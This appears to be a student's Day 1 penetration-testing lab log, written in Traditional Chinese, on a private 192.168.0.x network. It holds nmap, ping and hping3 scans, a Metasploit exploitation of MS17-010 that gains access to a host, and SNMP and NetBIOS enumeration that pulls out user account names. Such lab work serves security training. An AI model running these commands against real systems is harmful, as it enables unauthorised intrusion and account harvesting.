Day1
===
Host Discovery: IP (arp, icmp, 25, 80, 445, 3389)
---
    sudo nmap –n –sn –PS22,80,445,3389 192.168.0.* –oG - |grep Up | cut –d" " –f2 > iplist
    利用常見的連接埠探測機器是否有開啟這些連接埠
<img  alt="image" src="https://github.com/user-attachments/assets/20801a33-6b66-4cc0-b612-f9983fd3ae7b">

**補充**

1.nmap預設只掃1000常用的連接埠
            
2.nmap沒有權限只會進行TCP connect scan只能掃80、443，若要完整的掃描開放端口需加sudo，因要進行SYN掃描要創建數據包，root權限才能創建

    若環境無法安裝nmap可以利用迴圈
    for i in {1..254}; do (ping -c 1 192.168.0.$i | grep "bytes from" &); done
<img  alt="image" src="https://github.com/user-attachments/assets/b5b183ea-2680-48be-bdd7-b5c513864579">

    UDP Scan 可清楚看到137有回應，138可能有開但被過濾,139完全沒有回應

<img alt="image" src="https://github.com/user-attachments/assets/73263ac5-23e4-4f12-82d8-10c4e4fd1e16">

    sudo hping3 192.168.0.7 -n -S -c 3 -p 80，利用hping發送封包

<img  alt="image" src="https://github.com/user-attachments/assets/596f3f6f-44cc-4d4c-871d-62e507fe2501">

Service/OS Discovery
---
        
    sudo nmap -n -p445,3389 -sVC 192.168.0.21，發現此台主機有開啟smb v1
<img alt="image" src="https://github.com/user-attachments/assets/c6494a73-cc45-4c6b-aa4c-b005a88a254e">

    sudo nmap -n --script=smb-vuln-ms17-010.nse 192.168.0.21 使用nmap上的腳本進行scan
<img alt="image" src="https://github.com/user-attachments/assets/2950f88e-461c-4a1c-ad3d-08a04613a8cc">

Initial Access - Exploit MS17_010
---

    msfconsole -q 執行metasploit
    search ms17_010

<img alt="image" src="https://github.com/user-attachments/assets/6ad42976-a471-4f71-b7b2-4964d0f2f2f7">

    use 2
<img  alt="image" src="https://github.com/user-attachments/assets/46192082-9fcc-437f-bdfe-37eeb45a7ca2">

    show options

<img  alt="image" src="https://github.com/user-attachments/assets/9b8530f0-dfb7-4b49-9a34-1ee8a7d78329">

    set rhost 192.168.0.21
    set lhost 192.168.0.18
    run
<img  alt="image" src="https://github.com/user-attachments/assets/cc831b10-7387-4047-a2bd-33993b9dd238">

    成功打進去192.168.0.21
<img  alt="image" src="https://github.com/user-attachments/assets/d5bb80d8-953f-4724-a11a-a64047a7b9d9">

ENUM SNMP - UDP 161
---
    sudo nmap -n -p161 -sU --open 192.168.0.* -oG - | grep Up | cut -d' ' -f2 > snmp_ip.txt
<img  alt="image" src="https://github.com/user-attachments/assets/876c4d64-92e6-448b-ae50-b71cccd310d7">

    使用onesixtyone -i snmp_ips.txt public驗證是否有使用SNMP服務
<img  alt="image" src="https://github.com/user-attachments/assets/8af77a23-0854-4611-90d5-22037f5c6d19">

    snmp-check 192.168.0.20 取得該電腦的資訊並蒐集
<img  alt="image" src="https://github.com/user-attachments/assets/4887d1fb-b79a-482f-8365-158ee5bd5671">

    sudo nmap -n -p161 -sU --script snmp-win32-users 192.168.0.20 取得帳號資訊
<img alt="image" src="https://github.com/user-attachments/assets/0645da01-62b8-49f9-b53b-4b6487049b1c">

NetBIOS over TCP/IP (NetBT)
---
    NetBIOS資訊蒐集 sudo nbtscan -r 192.168.0.0/24
<img  alt="image" src="https://github.com/user-attachments/assets/b47de249-1aaf-4b3d-ae3d-5f5ec154eed5">


